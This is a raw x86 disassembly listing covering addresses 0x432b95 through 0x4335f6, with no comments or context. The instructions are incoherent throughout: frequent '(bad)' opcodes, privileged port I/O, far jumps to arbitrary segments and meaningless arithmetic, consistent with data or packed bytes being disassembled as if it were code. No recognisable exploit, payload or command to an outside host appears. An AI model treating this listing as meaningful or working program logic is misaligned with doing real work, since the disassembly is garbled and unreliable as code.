  432b95:	repz jae 0x432bd1
  432b98:	outs   dx,DWORD PTR ds:[esi]
  432b99:	aaa    
  432b9a:	mov    edi,0x7b037412
  432b9f:	sti    
  432ba0:	stos   DWORD PTR es:[edi],eax
  432ba1:	outs   dx,BYTE PTR ds:[esi]
  432ba2:	add    edi,edi
	...
  432bc0:	add    BYTE PTR [eax],al
  432bc2:	pusha  
  432bc3:	sub    BYTE PTR [ebx],cl
  432bc5:	dec    DWORD PTR ds:0xaad88c76
  432bcb:	cmovno edx,ebx
  432bce:	xchg   esi,eax
  432bcf:	inc    ecx
  432bd0:	mov    cl,BYTE PTR [edx+edi*8+0x27]
  432bd4:	daa    
  432bd5:	jg     0x432bd2
  432bd7:	sub    bh,bh
  432bd9:	or     DWORD PTR [ebp-0x13],0x14
  432bdd:	xchg   DWORD PTR [ebx],ecx
  432bdf:	cli    
  432be0:	inc    eax
  432be1:	je     0x432c14
  432be3:	sub    eax,0x80ddc304
  432be8:	mov    cl,0x12
  432bea:	or     eax,0x76016f29
  432bef:	sub    esi,ebp
  432bf1:	mov    edi,0xbddd16ba
  432bf6:	or     DWORD PTR [ecx],ebp
  432bf8:	fsqrt  
  432bfa:	and    BYTE PTR [ecx-0x5bf2bfeb],cl
  432c00:	ds jp  0x432bdb
  432c03:	sbb    DWORD PTR [edi+0x2f],eax
  432c06:	pop    edi
  432c07:	jbe    0x432b8b
  432c09:	shr    BYTE PTR [ebx-0x1e4cefd0],0x96
  432c10:	test   bl,bh
  432c12:	in     eax,dx
  432c13:	ins    BYTE PTR es:[edi],dx
  432c14:	push   es
  432c15:	jg     0x432c61
  432c17:	imul   BYTE PTR [eax-0x47e2f582]
  432c1d:	add    DWORD PTR [ebx+ebp*2-0x4],ecx
  432c21:	iret   
  432c22:	jns    0x432c35
  432c24:	in     al,dx
  432c25:	rol    BYTE PTR [eax],0x0
	...
  432c44:	xor    BYTE PTR [ecx+edx*8],0x8c
  432c48:	push   ebp
  432c49:	push   es
  432c4a:	or     cl,0x65
  432c4d:	push   edi
  432c4e:	adc    BYTE PTR [ebx-0x47b8ce7],dh
  432c54:	sub    eax,0xd27f05b5
  432c59:	sub    eax,0xffc27ea8
  432c5e:	in     al,dx
  432c5f:	mov    dh,0xe
  432c61:	enter  0xbd2f,0xa8
  432c65:	(bad)  
  432c66:	or     eax,0x64071f56
  432c6b:	inc    esp
  432c6c:	daa    
  432c6d:	or     esi,DWORD PTR [eax+edx*1+0xd]
  432c71:	rcl    DWORD PTR [esi],1
  432c73:	(bad)  
  432c74:	stos   BYTE PTR es:[edi],al
  432c75:	(bad)  
  432c76:	fld    DWORD PTR [ebx]
  432c78:	or     eax,0x95a69ff3
  432c7d:	add    ebp,DWORD PTR [ebx]
  432c7f:	inc    ebx
  432c80:	retf   0xd6cd
  432c83:	pop    edx
  432c84:	mov    ch,BYTE PTR [edi]
  432c86:	loop   0x432cfe
  432c88:	jne    0x833280c7
  432c8e:	jg     0x432c9d
  432c90:	fdivp  st(4),st
  432c92:	jmp    0xd36dc00d
  432c97:	nop
  432c98:	fnsave [esi+0x3]
  432c9b:	cmp    DWORD PTR [ebx],0xfffffffc
  432c9e:	fld    DWORD PTR [esi]
  432ca0:	adc    BYTE PTR [ecx+0x5a],cl
  432ca3:	add    al,0xd
  432ca5:	sub    esp,ebx
  432ca7:	nop
	...
  432cc4:	add    BYTE PTR [eax],al
  432cc6:	mov    ebp,0x1b82c396
  432ccb:	cld    
  432ccc:	mov    ecx,0x3a69101f
  432cd1:	add    al,0xd
  432cd3:	jl     0x432ce3
  432cd5:	mov    eax,0xc4e8080f
  432cda:	xor    BYTE PTR [ecx+0xe],bl
  432cdd:	pop    es
  432cde:	int    0x20
  432ce0:	in     eax,0x8b
  432ce2:	or     al,0x71
  432ce4:	call   0xfe45fc6b
  432ce9:	jns    0x432d5a
  432ceb:	jnp    0x432d16
  432ced:	mov    ecx,0xb91e7c12
  432cf2:	push   cs
  432cf3:	jo     0x432cf5
  432cf5:	call   0x297462f1
  432cfa:	jecxz  0x432cca
  432cfc:	mov    esi,0x7f24863c
  432d01:	int    0x2
  432d03:	mov    ch,0x64
  432d05:	aad    0xe
  432d07:	lds    edx,FWORD PTR [ecx+0x62]
  432d0a:	gs std 
  432d0c:	mov    ebp,?
  432d0e:	adc    BYTE PTR [ebp+0x45],bh
  432d11:	in     eax,dx
  432d12:	(bad)  
  432d13:	loopne 0x432d14
  432d15:	sbb    eax,0xf2f7c398
  432d1a:	cmp    DWORD PTR [ecx],ecx
  432d1c:	jg     0x432cc3
  432d1e:	push   cs
  432d1f:	add    BYTE PTR [eax],al
  432d21:	jb     0x432d68
  432d23:	add    eax,0x870c897f
  432d28:	inc    ebp
  432d29:	xchg   ebp,eax
	...
  432d46:	add    BYTE PTR [eax],al
  432d48:	aaa    
  432d49:	sti    
  432d4a:	xchg   ah,bh
  432d4c:	push   es
  432d4d:	jge    0x432d17
  432d4f:	push   0x4d
  432d51:	xor    DWORD PTR [eax],eax
  432d53:	(bad)  
  432d54:	call   0xc8a54904
  432d59:	in     al,dx
  432d5a:	lock fimul DWORD PTR [edx]
  432d5d:	jle    0x432d6f
  432d5f:	and    edx,DWORD PTR [ecx+edx*1+0x74]
  432d63:	in     al,dx
  432d64:	dec    esi
  432d65:	out    dx,al
  432d66:	rcr    bl,0xda
  432d69:	jl     0x432d63
  432d6b:	adc    bl,bl
  432d6d:	mov    edi,0x1d06a488
  432d72:	or     eax,0x7b29d9f
  432d77:	bound  edi,QWORD PTR [ecx]
  432d79:	sub    bh,bh
  432d7b:	in     eax,dx
  432d7c:	push   cs
  432d7d:	add    BYTE PTR [edi-0x43d78df],al
  432d83:	bound  esp,QWORD PTR [ebp+0x7ddd8d08]
  432d89:	sti    
  432d8a:	(bad)  
  432d8b:	jmp    esp
  432d8d:	add    al,ch
  432d8f:	es mov ecx,0xf4840000
  432d95:	add    eax,0xb4ab84
  432d9a:	add    BYTE PTR [ebp+0x531577b3],al
  432da0:	aas    
  432da1:	mov    ebx,0xf2c1cee7
  432da6:	test   BYTE PTR [ebx-0x317d4027],0x0
	...
  432dc9:	add    BYTE PTR [edi],bl
  432dcb:	or     DWORD PTR [ecx-0x3f82cafc],ecx
  432dd1:	psubb  mm0,QWORD PTR [eax+eax*1+0x44ea7400]
  432dd9:	adc    BYTE PTR [ebp+0x6c],ah
  432ddc:	imul   ecx,DWORD PTR [ebx-0x397d3fdf],0x48cfbef
  432de6:	in     al,dx
  432de7:	jle    0x432e21
  432de9:	add    BYTE PTR [eax+0x53],bl
  432dec:	xor    BYTE PTR [eax],0xfa
  432def:	repnz adc al,0xc4
  432df2:	inc    ax
  432df4:	sti    
  432df5:	test   BYTE PTR [ebp+esi*2+0x4d],dh
  432df9:	xor    esi,esi
  432dfb:	test   BYTE PTR cs:[ebp-0x75ee8a1c],0x30
  432e03:	sub    edi,DWORD PTR [ebx-0x7]
  432e06:	adc    al,0x78
  432e08:	add    eax,DWORD PTR [eax-0x67ff743]
  432e0e:	sub    BYTE PTR [ebx+0x1],ch
  432e11:	inc    edx
  432e12:	mov    ebx,0x4e7cf338
  432e17:	sub    DWORD PTR [ebp-0x73ce0f73],edi
  432e1d:	push   eax
  432e1e:	adc    edi,DWORD PTR [ebx-0x36]
  432e21:	js     0x432e30
  432e23:	xor    eax,0xa9270c89
  432e28:	and    BYTE PTR ss:[ecx+0x31],ah
  432e2c:	jg     0x432e17
	...
  432e4a:	add    BYTE PTR [eax],al
  432e4c:	add    al,0xa9
  432e4e:	ss add al,0x42
  432e51:	and    eax,0x354445c7
  432e56:	clc    
  432e57:	stc    
  432e58:	inc    ebx
  432e59:	sub    eax,0x3133c082
  432e5e:	iret   
  432e5f:	push   edx
  432e60:	inc    ebx
  432e61:	inc    ecx
  432e62:	lea    edx,ds:0x445290d
  432e68:	(bad)  [eax]
  432e6a:	mov    BYTE PTR [ebp-0x6b],al
  432e6d:	jb     0x432e31
  432e6f:	sti    
  432e70:	inc    esp
  432e71:	in     al,0xb
  432e73:	or     ecx,DWORD PTR [edi+0x7afb3c52]
  432e79:	scas   al,BYTE PTR es:[edi]
  432e7a:	sar    ebx,0xd2
  432e7d:	repnz fmul st,st(0)
  432e80:	dec    edi
  432e81:	cmp    edi,edi
  432e83:	xchg   al,cl
  432e85:	test   BYTE PTR [eax+0x12e265fa],cl
  432e8b:	add    BYTE PTR ds:0x36fb46a6,cl
  432e91:	jg     0x432e65
  432e93:	xchg   BYTE PTR [ecx],dh
  432e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432e96:	sub    cl,BYTE PTR [esi+ecx*4]
  432e99:	inc    esp
  432e9a:	aaa    
  432e9b:	add    dh,bl
  432e9d:	push   0xffffff88
  432e9f:	out    dx,al
  432ea0:	mov    es,WORD PTR [ebx]
  432ea2:	add    al,0x8d
  432ea4:	stc    
  432ea5:	and    ah,dl
  432ea7:	mov    al,dl
  432ea9:	mov    esp,0xfe195585
  432eae:	cmp    eax,0xb
	...
  432ecb:	add    BYTE PTR [eax],al
  432ecd:	add    BYTE PTR [esi+0xdfffee7],cl
  432ed3:	lahf   
  432ed4:	push   es
  432ed5:	xor    ah,0xff
  432ed8:	enter  0x8b7,0x80
  432edc:	and    BYTE PTR [edx],cl
  432ede:	imul   eax,DWORD PTR ds:0xb3103a69,0xbc85c3e0
  432ee8:	add    al,0xf8
  432eea:	nop
  432eeb:	lods   eax,DWORD PTR ds:[esi]
  432eec:	add    eax,edi
  432eee:	mov    BYTE PTR [edx],al
  432ef0:	data16 arpl WORD PTR ds:0x1589e900,cx
  432ef7:	test   DWORD PTR [ecx+0x5],esp
  432efa:	lea    esi,[esi]
  432efc:	add    dh,BYTE PTR [eax-0x19317fef]
  432f02:	sbb    DWORD PTR [ebx],ecx
  432f04:	pusha  
  432f05:	mov    ecx,0x8dfd2696
  432f0a:	push   es
  432f0b:	add    al,0xe4
  432f0e:	inc    BYTE PTR [edx]
  432f10:	imul   edi,DWORD PTR ds:0x83e3b414,0x1230474
  432f1a:	into   
  432f1b:	neg    BYTE PTR [esi-0x4d798f4a]
  432f21:	out    dx,eax
  432f22:	cmp    ah,BYTE PTR [esi]
  432f24:	sar    ebx,0xf7
  432f27:	lods   al,BYTE PTR ds:[esi]
  432f28:	aad    0xf6
  432f2a:	inc    ebp
  432f2b:	test   BYTE PTR [edx],ah
  432f2d:	cmp    esi,DWORD PTR [edx]
  432f2f:	std    
  432f30:	daa    
  432f31:	int3   
	...
  432f4e:	add    BYTE PTR [eax],al
  432f50:	ret    0xcf7
  432f53:	mov    al,0x35
  432f55:	sub    DWORD PTR [eax],ebp
  432f57:	add    eax,0xfea1fcb9
  432f5c:	and    BYTE PTR [ebp-0x53e700b4],ch
  432f62:	in     eax,0x3a
  432f64:	enter  0x6e33,0x5b
  432f68:	jmp    0x38:0x588f3cd4
  432f6f:	fs adc eax,0xee90483
  432f75:	add    al,ch
  432f77:	pusha  
  432f78:	sbb    al,BYTE PTR [eax]
  432f7a:	add    BYTE PTR [ebp+0x51],ah
  432f7d:	lods   al,BYTE PTR ds:[esi]
  432f7e:	xor    eax,0x5ab426c
  432f83:	fimul  DWORD PTR [esi-0x58]
  432f86:	sub    bh,BYTE PTR [edi-0x32]
  432f89:	xor    DWORD PTR [ebx],edi
  432f8b:	adc    cl,BYTE PTR [esi*1+0x7193f575]
  432f92:	call   0xfb783227
  432f97:	jb     0x432f9d
  432f99:	jns    0x432ff0
  432f9b:	loope  0x432f36
  432f9d:	cld    
  432f9e:	nop
  432f9f:	ins    BYTE PTR es:[edi],dx
  432fa0:	dec    esi
  432fa1:	lods   al,BYTE PTR ds:[esi]
  432fa2:	adc    esi,ecx
  432fa4:	int    0x29
  432fa6:	xchg   DWORD PTR [ebx*8+0x453c88bc],ebx
  432fad:	jns    0x432f72
  432faf:	sar    BYTE PTR [edi+0x36],0xfb
  432fb3:	scas   al,BYTE PTR es:[edi]
	...
  432fd0:	add    BYTE PTR [eax],al
  432fd2:	mov    edi,DWORD PTR [ebx+0x790592f7]
  432fd8:	inc    ebp
  432fd9:	mov    eax,ds:0x26e7f69b
  432fde:	std    
  432fdf:	(bad)  
  432fe0:	jmp    FWORD PTR [ecx-0x3a]
  432fe3:	xor    al,0x5b
  432fe5:	daa    
  432fe6:	xor    cl,BYTE PTR [eax-0x41]
  432fe9:	adc    al,0x9a
  432feb:	and    al,0x7f
  432fed:	test   DWORD PTR [edx],ecx
  432fef:	mov    cl,0x64
  432ff1:	jno    0x433001
  432ff3:	rcl    DWORD PTR [ecx+0x72],0xf8
  432ff7:	mov    al,0x21
  432ff9:	jmp    0xbe8b4493
  432ffe:	xchg   ecx,eax
  432fff:	mov    ebx,0x2d3560fb
  433004:	aaa    
  433005:	add    bh,ah
  433007:	add    eax,0xfcf4d57b
  43300c:	dec    DWORD PTR [esi]
  43300e:	add    DWORD PTR ds:0x7004f97b,0x5
  433015:	sub    DWORD PTR ds:0x770f6a04,0xfffffff4
  43301c:	or     al,0x77
  43301e:	out    dx,al
  43301f:	jns    0x432fe1
  433021:	add    ch,BYTE PTR [ebp+0x40]
  433024:	idiv   DWORD PTR [ebx]
  433026:	daa    
  433027:	imul   ebx,edi,0x3b
  43302a:	test   DWORD PTR ds:0xfcb4b17b,0x5030eff
  433034:	lea    edi,[eax+0x0]
	...
  433053:	add    BYTE PTR [esi+0x4027f97b],ah
  433059:	xor    DWORD PTR [edx-0x7],edi
  43305c:	push   ss
  43305d:	popa   
  43305e:	pop    ss
  43305f:	mov    edx,DWORD PTR [ebp-0x7c]
  433062:	jge    0x433060
  433064:	mov    edi,0x7bb70628
  433069:	jnp    0x433064
  43306b:	and    BYTE PTR [eax+0xd],al
  43306e:	jnp    0x433069
  433070:	ins    DWORD PTR es:[edi],dx
  433071:	push   0x4
  433073:	sub    DWORD PTR [ebp-0x8f89208],0xffffffbe
  43307a:	stc    
  43307b:	cmp    bh,BYTE PTR [edi+0x69]
  43307e:	fimul  WORD PTR [ebx-0x142cdd55]
  433084:	cmp    ebx,DWORD PTR [esi+0x38]
  433087:	pop    ss
  433088:	inc    ecx
  433089:	push   cs
  43308a:	sub    ecx,ecx
  43308c:	test   eax,0x30ebf93e
  433091:	cmp    eax,0x5e26e87a
  433096:	jp     0x4330d0
  433098:	push   0xdf6f160
  43309d:	call   0xa655a4a0
  4330a2:	inc    eax
  4330a3:	(bad)  
  4330a4:	xlat   BYTE PTR ds:[ebx]
  4330a5:	mov    ebp,0xc246d9b1
  4330aa:	stos   BYTE PTR es:[edi],al
  4330ab:	add    ecx,DWORD PTR [esi-0x7801ccbc]
  4330b1:	(bad)  
  4330b2:	in     al,dx
  4330b3:	pop    esp
  4330b4:	icebp  
  4330b5:	mov    dl,0xc2
  4330b7:	test   DWORD PTR [eax],0x0
	...
  4330d5:	add    BYTE PTR [eax+0xd04821d],bl
  4330db:	sbb    edi,edi
  4330dd:	rcl    dh,1
  4330df:	add    DWORD PTR [eax+0xe],ebp
  4330e2:	or     eax,0x41c07b19
  4330e7:	ins    DWORD PTR es:[edi],dx
  4330e8:	jp     0x4330c1
  4330ea:	cmp    BYTE PTR [ebx],ah
  4330ec:	hlt    
  4330ed:	mov    edi,0x3fab9125
  4330f2:	or     eax,0xaa052cd9
  4330f7:	aam    0x37
  4330f9:	xchg   esi,ecx
  4330fb:	inc    ecx
  4330fc:	or     bh,dh
  4330fe:	call   0x3c0c:0x860a8c3e
  433105:	mov    DWORD PTR [ecx],edx
  433107:	enter  0xc079,0xf9
  43310b:	push   eax
  43310c:	cmp    BYTE PTR [ebp+0x75],al
  43310f:	mov    ds:0x5e8ef3d1,al
  433114:	add    eax,0x8c8ce889
  433119:	ret    
  43311a:	je     0x433156
  43311c:	cmp    bl,bh
  43311e:	pop    edx
  43311f:	mov    ds:0x3466f7b9,al
  433124:	mov    WORD PTR [ebp+0x45],es
  433127:	mov    dl,0xf8
  433129:	out    0xcd,eax
  43312b:	dec    ecx
  43312c:	(bad)  
  43312d:	dec    DWORD PTR [esi-0x2ca4c79f]
  433133:	(bad)  
  433134:	mov    ebp,0x6dd56a4a
  433139:	daa    
	...
  433156:	add    BYTE PTR [eax],al
  433158:	mov    ds:0xbcd4fd1b,al
  43315d:	repnz sub eax,0x702ee3d0
  433163:	(bad)  
  433164:	(bad)  
  433165:	js     0x433103
  433167:	cmp    eax,DWORD PTR [ebp+ecx*8-0x1c]
  43316b:	or     BYTE PTR [edi+0xd03e95a],cl
  433171:	jnp    0x433127
  433173:	cmp    edx,DWORD PTR [edx+0x986f0c4]
  433179:	js     0x4331d9
  43317b:	adc    ecx,edi
  43317d:	les    ecx,FWORD PTR [ecx]
  43317f:	add    eax,DWORD PTR [esp+eax*8+0x1ad38c14]
  433186:	aam    0xa1
  433188:	inc    ebx
  433189:	sub    cl,cl
  43318b:	scas   eax,DWORD PTR es:[edi]
  43318c:	adc    eax,0x43b65a6
  433191:	mov    dl,0xea
  433193:	popf   
  433194:	sub    ebp,DWORD PTR [eax]
  433196:	in     al,dx
  433197:	lods   eax,DWORD PTR ds:[esi]
  433198:	adc    DWORD PTR [ebx+0x770602a8],eax
  43319e:	call   0x3c82bb40
  4331a3:	and    esi,DWORD PTR [edx+0x3]
  4331a6:	mov    ds:0x170087c1,eax
  4331ab:	aaa    
  4331ac:	and    BYTE PTR [eax],ah
  4331ae:	xlat   BYTE PTR ds:[ebx]
  4331af:	ret    
  4331b0:	jb     0x43322d
  4331b2:	cmc    
  4331b3:	sti    
  4331b4:	cdq    
  4331b5:	mov    ebx,0xb4900bef
  4331ba:	pushf  
  4331bb:	lea    eax,[eax]
	...
  4331d9:	add    al,dl
  4331db:	das    
  4331dc:	sub    DWORD PTR [eax],0x7fe8fffc
  4331e2:	dec    ebp
  4331e3:	mov    bl,0x1a
  4331e5:	add    eax,0x27
  4331e8:	add    cl,ch
  4331ea:	xchg   esp,ecx
  4331ec:	repz test DWORD PTR [esi],0x88c11fa6
  4331f3:	ja     0x4331f9
  4331f5:	loop   0x43325a
  4331f7:	scas   al,BYTE PTR es:[edi]
  4331f8:	jl     0x433250
  4331fa:	adc    DWORD PTR [edi+eax*1+0x61d62cc3],esi
  433201:	jo     0x433210
  433203:	mov    ch,0x42
  433205:	jb     0x4331d3
  433207:	sbb    ebx,edi
  433209:	stc    
  43320a:	xchg   ebx,eax
  43320c:	out    dx,eax
  43320d:	pop    esp
  43320e:	std    
  43320f:	mov    dh,0xe7
  433211:	sbb    ebp,DWORD PTR [eax]
  433213:	sub    ebx,edi
  433215:	jmp    0x23:0x94801da5
  43321c:	je     0x4331fd
  43321e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43321f:	or     ebx,DWORD PTR [eax-0x71]
  433222:	cdq    
  433223:	add    al,0x77
  433225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433226:	mov    edi,0xd60626d
  43322b:	mov    ch,0xfa
  43322d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43322e:	test   BYTE PTR [ebp+eax*2+0xbc4a7e1],0xee
  433236:	mov    ebx,ss
  433238:	cli    
  433239:	(bad)  
  43323a:	jecxz  0x4331c0
  43323c:	mov    edi,0x2e
	...
  433259:	add    BYTE PTR [eax],al
  43325b:	add    BYTE PTR [ebx+0x16abc8d6],bh
  433261:	add    bl,bh
  433263:	xor    al,0x3d
  433265:	sbb    BYTE PTR [ebx+ebx*8+0xe],al
  433269:	add    BYTE PTR [edi],ch
  43326b:	test   eax,0x72551b27
  433270:	xor    dl,dl
  433272:	push   edx
  433273:	jb     0x433296
  433275:	test   DWORD PTR [ebp-0x1f],ecx
  433278:	xchg   DWORD PTR [eax],esi
  43327a:	test   DWORD PTR [eax+0x84f99d],esp
  433280:	xchg   ebx,eax
  433281:	pop    ebp
  433282:	jae    0x9d2c2904
  433288:	and    al,0x1
  43328a:	add    BYTE PTR [ebp+0x33066fa3],al
  433290:	hlt    
  433291:	inc    eax
  433292:	call   0x446727
  433297:	xor    esp,esp
  433299:	fisttp DWORD PTR [eax+0x4b012400]
  43329f:	mov    esi,ecx
  4332a1:	in     al,dx
  4332a2:	or     DWORD PTR [eax-0xc],eax
  4332a5:	xor    esi,0x7a30b9ff
  4332ab:	jge    0x43327d
  4332ad:	cmc    
  4332ae:	je     0x4332d2
  4332b0:	pop    esi
  4332b1:	cs push es
  4332b3:	mov    esi,0xd0b605c5
  4332b8:	iret   
  4332b9:	out    dx,al
  4332ba:	je     0x433313
  4332bc:	iret   
  4332bd:	lds    eax,FWORD PTR [ebx+0xc0]
	...
  4332db:	add    BYTE PTR [eax],al
  4332dd:	add    BYTE PTR [eax+0x54],cl
  4332e0:	mov    ch,BYTE PTR ds:[ebx+0x7d34b605]
  4332e7:	add    eax,0xeecfd0b6
  4332ec:	jae    0x4332dc
  4332ee:	mov    edi,0x67ff5040
  4332f3:	jbe    0x433342
  4332f5:	or     BYTE PTR [edi],ch
  4332f7:	hlt    
  4332f8:	jp     0x433377
  4332fa:	mov    al,0xf3
  4332fc:	je     0x433307
  4332fe:	sub    esi,ebx
  433300:	retf   0x318b
  433303:	cld    
  433304:	mov    BYTE PTR [ebp+0x70],al
  433307:	ja     0x43335e
  433309:	or     al,0x7f
  43330b:	out    dx,al
  43330c:	je     0x43332f
  43330e:	stc    
  43330f:	fnsave [ebx+0x1d]
  433312:	jmp    0xd5ca6e8
  433317:	dec    edx
  433318:	aas    
  433319:	test   DWORD PTR [edi],edi
  43331b:	cld    
  43331c:	or     cl,BYTE PTR [ebx]
  43331e:	mov    esp,DWORD PTR [edi+0x4]
  433321:	mov    edx,0x75305222
  433326:	push   es
  433327:	fdivr  DWORD PTR [edi+edi*1-0x1547a70a]
  43332e:	ss sbb al,ch
  433331:	in     eax,dx
  433332:	fsubp  st(7),st
  433334:	jp     0x433328
  433336:	or     dh,BYTE PTR [esi-0x2ab478c2]
  43333c:	pop    ebx
  43333d:	pop    ss
  43333e:	int    0x5e
  433340:	or     BYTE PTR [eax+eax*1+0x0],0x0
	...
  43335d:	add    BYTE PTR [eax],al
  43335f:	add    BYTE PTR [edx+ebp*8],dl
  433362:	loopne 0x433324
  433364:	pop    edx
  433365:	xchg   ebx,eax
  433366:	sar    BYTE PTR [ebp-0x7935e6fb],cl
  43336c:	stc    
  43336d:	imul   ecx,esp,0xffffff86
  433370:	in     al,0xae
  433372:	ret    0x8607
  433375:	or     DWORD PTR [ebx-0x37],edi
  433378:	pop    eax
  433379:	dec    ebp
  43337a:	jp     0x433377
  43337c:	inc    ecx
  43337d:	dec    ebp
  43337e:	or     al,0xc2
  433381:	adc    BYTE PTR [ebp+0x7a190d00],dl
  433387:	sti    
  433388:	cmp    BYTE PTR [edx-0x10],cl
  43338b:	mov    edi,0x90504d
  433390:	or     eax,0xa4bff019
  433395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433396:	(bad)  
  433397:	dec    DWORD PTR ds:0x6d1d88e6
  43339d:	inc    edi
  43339e:	mov    edi,0x346b8fff
  4333a3:	jne    0x4333cf
  4333a5:	xchg   esi,eax
  4333a6:	mov    cl,0xb
  4333a8:	jb     0x43339e
  4333aa:	fimul  WORD PTR [edx]
  4333ac:	mov    ds:0x9e04ea00,al
  4333b1:	icebp  
  4333b2:	int    0x33
  4333b4:	loopne 0x433381
  4333b6:	mov    ebp,0xa984ef44
  4333bb:	scas   eax,DWORD PTR es:[edi]
  4333bc:	loope  0x43343c
  4333be:	stos   BYTE PTR es:[edi],al
  4333bf:	add    DWORD PTR [esi],edx
  4333c1:	jae    0x4333a5
  4333c3:	add    al,0x0
	...
  4333e1:	add    BYTE PTR [esi-0xc],bh
  4333e4:	scas   eax,DWORD PTR es:[edi]
  4333e5:	call   0x28bee80c
  4333ea:	rcl    al,1
  4333ec:	popa   
  4333ed:	push   eax
  4333ee:	mov    bh,BYTE PTR [ebp+0x7f1d88f0]
  4333f4:	aam    0x7
  4333f6:	push   ss
  4333f7:	mov    ch,0xdf
  4333f9:	int3   
  4333fa:	pop    es
  4333fb:	dec    edi
  4333fc:	outs   dx,BYTE PTR ds:[esi]
  4333fd:	(bad)  
  4333fe:	or     bh,BYTE PTR [ecx-0x5c]
  433401:	pop    es
  433402:	xchg   edx,eax
  433403:	aam    0xe4
  433405:	clc    
  433406:	loopne 0x4333bc
  433408:	add    edi,DWORD PTR [edi-0x21]
  43340b:	mov    bl,0xc7
  43340d:	jle    0x4333e2
  43340f:	mov    bl,0xfb
  433411:	lock call 0x51fa:0xf5b53784
  433419:	repnz pop ss
  43341b:	jae    0x4333ff
  43341d:	call   0x812ce8d5
  433422:	int3   
  433423:	std    
  433424:	gs cmp al,0xb3
  433427:	jmp    0x6ce:0x172941ad
  43342e:	jmp    0xe231:0x903d162d
  433435:	xchg   edx,eax
  433436:	int3   
  433437:	jbe    0x4333dc
  433439:	cmp    esp,DWORD PTR [ebp+0x6]
  43343c:	test   eax,0xefbb91cf
  433441:	xor    bl,BYTE PTR [edx]
  433443:	inc    ecx
  433444:	add    BYTE PTR [esi],dl
	...
  433462:	add    BYTE PTR [eax],al
  433464:	pop    edi
  433465:	retf   
  433466:	mov    ebp,0x86d50ee1
  43346b:	xchg   ebp,eax
  43346c:	cmp    BYTE PTR [ecx-0x3b260ebb],al
  433472:	sti    
  433473:	ins    BYTE PTR es:[edi],dx
  433474:	ret    0x4a6
  433477:	push   0x9
  433479:	daa    
  43347a:	leave  
  43347b:	stos   BYTE PTR es:[edi],al
  43347c:	addr16 jnp 0x4334b3
  43347f:	loop   0x4334d5
  433481:	int    0xe7
  433483:	push   ecx
  433484:	sbb    BYTE PTR [eax],al
  433486:	add    BYTE PTR [esp+edx*2-0xa],bl
  43348a:	dec    edi
  43348b:	fs es dec di
  43348f:	mov    dh,0xdf
  433491:	adc    al,0x8c
  433493:	cli    
  433494:	dec    esi
  433495:	sub    ch,BYTE PTR [esi]
  433497:	and    BYTE PTR [edi+0x3f074c78],dh
  43349d:	(bad)  
  43349e:	jle    0x4334e1
  4334a0:	ds mov bl,0x8
  4334a3:	sahf   
  4334a4:	aas    
  4334a5:	adc    esp,eax
  4334a7:	fcmovne st,st(6)
  4334a9:	sub    eax,ecx
  4334ab:	sub    bl,dl
  4334ad:	cmp    BYTE PTR [edx+0x70],ah
  4334b0:	or     eax,0xba2ac8bd
  4334b5:	sbb    BYTE PTR [ebp+eax*8-0x3a],0x84
  4334ba:	sti    
  4334bb:	xchg   BYTE PTR ds:0xcbfec7a9,dl
  4334c1:	push   0x53
  4334c3:	lahf   
  4334c4:	push   ss
  4334c5:	into   
  4334c6:	adc    cl,ch
	...
  4334e4:	add    BYTE PTR [eax],al
  4334e6:	push   cs
  4334e7:	jnp    0x43352d
  4334e9:	or     eax,0x364ed00d
  4334ee:	mov    bh,0x26
  4334f0:	adc    eax,0xffbffb61
  4334f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4334f6:	push   edx
  4334f7:	out    0xfa,eax
  4334f9:	add    BYTE PTR [edx+eax*4-0x8],dh
  4334fd:	inc    DWORD PTR [ecx+0x2b]
  433500:	push   ecx
  433501:	call   DWORD PTR [ecx-0x3f]
  433504:	or     DWORD PTR [eax+0x74],eax
  433507:	cmp    bh,BYTE PTR [edx-0x4d28f3a]
  43350d:	pop    edx
  43350e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43350f:	dec    eax
  433510:	sub    ah,0x15
  433513:	and    DWORD PTR [ebp-0x4],0x458c4734
  43351a:	fs dec ebp
  43351c:	div    BYTE PTR [ebp+0x28]
  43351f:	xor    bh,BYTE PTR [ebx-0x18101673]
  433525:	xchg   ecx,eax
  433526:	mov    ds:0xc48bf6ed,al
  43352b:	ja     0x43351b
  43352d:	jns    0x43354d
  43352f:	out    dx,al
  433530:	je     0x43352e
  433532:	int3   
  433533:	adc    dl,BYTE PTR [eax]
  433535:	add    ah,dh
  433537:	or     DWORD PTR [eax],ecx
  433539:	mov    esi,DWORD PTR [ecx-0x3b27d28]
  43353f:	stos   DWORD PTR es:[edi],eax
  433540:	add    BYTE PTR [ebx-0x3c37b0de],cl
  433546:	sub    DWORD PTR [ecx+0x51eb],0x0
	...
  433568:	mov    ds:0x5f57efa9,al
  43356d:	das    
  43356e:	mov    WORD PTR [ebp-0x18],es
  433571:	dec    esp
  433572:	div    BYTE PTR [ebp-0x54]
  433575:	test   eax,0x4fa8bba
  43357a:	push   edx
  43357b:	idiv   BYTE PTR [ebx-0x47ba7712]
  433581:	cmp    al,0xff
  433584:	and    ebx,edi
  433586:	test   bl,bl
  433588:	inc    ecx
  433589:	sub    DWORD PTR [edi+edi*8+0x36f62541],eax
  433590:	or     eax,0xd0b523f
  433595:	pop    ss
  433596:	fidivr WORD PTR [ecx]
  433598:	nop
  433599:	repnz or al,0xfe
  43359c:	jb     0x4335c1
  43359e:	add    BYTE PTR [eax],al
  4335a0:	or     eax,0xcafbc29e
  4335a5:	clc    
  4335a6:	ss mov edi,0x511fadb8
  4335ac:	mov    es,WORD PTR [ebx]
  4335ae:	xor    BYTE PTR [eax],al
  4335b0:	mov    ebx,0xdd0fc2a3
  4335b5:	jns    0x43356a
  4335b7:	or     edx,DWORD PTR [eax-0x6217d025]
  4335bd:	mov    al,0x30
  4335bf:	sti    
  4335c0:	xchg   BYTE PTR [esi+0x1ca4f282],ah
  4335c6:	xor    BYTE PTR [ebp+0x21],dh
  4335c9:	into   
  4335ca:	mov    DWORD PTR [ebx],ecx
	...
  4335e8:	add    BYTE PTR [eax],al
  4335ea:	or     eax,0x86081c17
  4335ef:	pop    ebx
  4335f0:	sub    eax,DWORD PTR [edi+0x1762158]
  4335f6:	xchg   esi,eax
